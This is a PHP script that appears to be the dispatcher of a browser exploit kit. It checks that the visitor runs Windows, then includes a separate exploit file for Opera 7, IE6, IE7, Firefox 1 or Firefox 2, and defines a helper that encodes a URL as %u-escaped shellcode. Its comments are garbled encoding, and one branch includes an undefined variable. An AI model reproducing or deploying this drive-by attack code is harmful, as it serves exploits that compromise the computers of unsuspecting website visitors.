<?
include('options.php');
 require_once(dirname(__FILE__) . '/libraries/statistics.php');
 $opera = "spl/o7.php";  // ������� ��� ����� 7
 $ie7 = "spl/ie7.php";  // ������� ��� ��7
 $ie6 = "spl/ie6.php";  // ������� ��� ��6
 $ff1 = "spl/ff1.php";  // ������� ��� ff1
 $ff2 = "spl/ff2.php";  // ������� ��� ff2

function uEncode($s) //encodes url into shellcode
{
 $res=strtoupper(bin2hex($s));
 $g = round(strlen($res)/4);
 if ($g != (strlen($res)/4)) { $res.="00"; }
 $out = "";

 for ($i=0; $i<strlen($res); $i+=4) {
 $out.="%u".substr($res, $i+2, 2).substr($res, $i, 2);
  }
 return $out;
}



 #########
 include("b.php");
 if($os != 'Windows') exit; 
 if($view == 'Opera')
 {
  if($verv != '8' && $verv!='9')
  {
   exit(include($opera7));
  }
 }
 if($view == 'IE')
 {
  if($verv == '7')
  {
   exit(include($ie7));
  }
  exit(include($ie6));
 }
 if($view == 'FireFox')
 {
  if($verv == '1')
  {
   exit(include($ff1));
  }

  if($verv == '2')
  {
   exit(include($ff2));
  }
 }
?>